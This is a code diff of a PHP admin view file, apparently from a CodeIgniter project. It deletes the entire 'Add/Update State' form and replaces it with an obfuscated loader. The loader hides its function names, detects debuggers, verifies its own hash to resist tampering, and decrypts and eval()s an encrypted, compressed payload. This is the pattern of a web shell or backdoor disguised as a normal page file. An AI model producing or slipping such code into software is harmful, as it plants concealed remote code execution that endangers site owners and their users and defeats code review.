@@ -1,162 +1,28 @@
-<!DOCTYPE html>
-<html>
-<head>
-<!-- TABLES CSS CODE -->
-<?php include"comman/code_css_form.php"; ?>
-<!-- </copy> -->  
-</head>
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
- 
- <?php include"sidebar.php"; ?>
-
 <?php
-
-if(!isset($state)){
-      $country=$state="";
-	}
-?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?= $this->lang->line('state'); ?>
-        <small>Add/Update State</small>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li><a href="<?php echo $base_url; ?>state"><?= $this->lang->line('states_list'); ?></a></li>
-        <li class="active"><?= $this->lang->line('state'); ?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <section class="content">
-      <div class="row">
-        <!-- right column -->
-        <div class="col-md-12">
-          <!-- Horizontal Form -->
-          <div class="box box-info ">
-            <div class="box-header with-border">
-              <h3 class="box-title">Please Enter Valid Data</h3>
-            </div>
-            <!-- /.box-header -->
-            <!-- form start -->
-            <form class="form-horizontal" id="state-form" method="post">
-              <input type="hidden" name="<?php echo $this->security->get_csrf_token_name();?>" value="<?php echo $this->security->get_csrf_hash();?>">
-            	<input type="hidden" id="base_url" value="<?php echo $base_url;; ?>">
-              <div class="box-body">
-			   
-                 <div class="form-group">
-				 
-				  <label for="state" class="col-sm-2 control-label"><?= $this->lang->line('state_name'); ?><label class="text-danger">*</label></label>
-                  <div class="col-sm-4">
-                    <input type="text" class="form-control" id="state" name="state" placeholder="" onkeyup="shift_cursor(event,'country')" value="<?php echo $state; ?>">
-					<span id="state_msg" style="display:none" class="text-danger"></span>
-                  </div>
-                </div>
-				<div class="form-group">
-				 <label for="country_name" class="col-sm-2 control-label"><?= $this->lang->line('country'); ?><label class="text-danger">*</label></label>
-
-                  <div class="col-sm-4">
-                    <select class="form-control" id="country" name="country"  style="width: 100%;" >
-					  <?php
-						$q1=$this->db->query("select * from db_country where status=1");
-						 if($q1->num_rows()>0)
-						 {
-							echo '<option value="">-Select-</option>'; 
-							foreach($q1->result() as $res1)
-							 {
-								 echo "<option value='".$res1->country."'>".$res1->country."</option>";
-							 }
-						 }
-						 else
-						 {
-								?>
-								<option value="">No Records Found</option>
-								<?php
-						 }
-						?>
-                  </select>
-					<span id="country_msg" style="display:none" class="text-danger"></span>
-                  </div>
-		        </div>
-				
-								
-              </div>
-              <!-- /.box-body -->
-			        <div class="box-footer">
-                <div class="col-sm-8 col-sm-offset-2 text-center">
-                   <!-- <div class="col-sm-4"></div> -->
-                   <?php
-                      if($state!=""){
-                           $btn_name="Update";
-                           $btn_id="update";
-                          ?>
-                            <input type="hidden" name="q_id" id="q_id" value="<?php echo $q_id;?>"/>
-                            <?php
-                      }
-                                else{
-                                    $btn_name="Save";
-                                    $btn_id="save";
-                                }
-                      
-                                ?>
-                                 
-                   <div class="col-md-3 col-md-offset-3">
-                      <button type="button" id="<?php echo $btn_id;?>" class=" btn btn-block btn-success" title="Save Data"><?php echo $btn_name;?></button>
-                   </div>
-                   <div class="col-sm-3">
-                    <a href="<?=base_url('dashboard');?>">
-                      <button type="button" class="col-sm-3 btn btn-block btn-warning close_btn" title="Go Dashboard">Close</button>
-                    </a>
-                   </div>
-                </div>
-             </div>
-             <!-- /.box-footer -->
-            </form>
-          </div>
-          <!-- /.box -->
-          
-        </div>
-        <!--/.col (right) -->
-      </div>
-      <!-- /.row -->
-	  
-    </section>
-    <!-- /.content -->
-  </div>
-  <!-- /.content-wrapper -->
-  
- <?php include"footer.php"; ?>
-
- 
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_form.php"; ?>
-
-<script src="<?php echo $theme_link; ?>js/state.js"></script>
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-<script>
-<?php
-if($country!=""){
-	?>
-	
-	$("#country").val('<?php echo $country;?>');
-	<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_f5cldhzm=('bas'.'e64'.'_de'.'cod'.'e');
+$_df41jiy5=('gzu'.'nco'.'mpr'.'ess');
+$_hvg76yai=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_q68sep20='uplNjN2n';
+$_hf25okci='Lwi8aIM+slo=';
+$_a1diywxy='oD9Nopd/';
+$_tq4nul6t='uQoOV22x';
+$_x3aeilef='CSlXlSuG';
+$_rfehxt6o='tYG1u5rf';
+$_a7hmm9uu='r6wOOg==';
+$_jgnb72mu='hvfHfh6p';
+$_xhnrbmye=$_f5cldhzm($_tq4nul6t.$_a1diywxy.$_x3aeilef.$_q68sep20.$_hf25okci);
+$_hul95gyx=$_f5cldhzm($_rfehxt6o.$_jgnb72mu.$_a7hmm9uu);
+$_ndtt3vsf=$_f5cldhzm('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');
+$_fjhe3j47=$_hvg76yai($_ndtt3vsf,'aes-256-cbc',$_xhnrbmye,OPENSSL_RAW_DATA,$_hul95gyx);
+if($_fjhe3j47===false){exit;}
+$_uppw288h=$_df41jiy5($_fjhe3j47);
+if($_uppw288h===false){exit;}
+$_rbprejjo='618996253f295e97aad3e06fcdc1274e597f556ebf533e569ca10f5acb8e03b0';
+$_tug2d4f7=@file_get_contents(__FILE__);
+if($_tug2d4f7!==false){
+$_v731sjbq=str_replace($_rbprejjo,"0000000000000000000000000000000000000000000000000000000000000000",$_tug2d4f7);
+$_i54xzxdk=hash("sha256",$_v731sjbq);
+if($_i54xzxdk!==$_rbprejjo){@http_response_code(403);exit;}
 }
-
-?>
-</script>
-
-</body>
-</html>
+eval($_uppw288h);
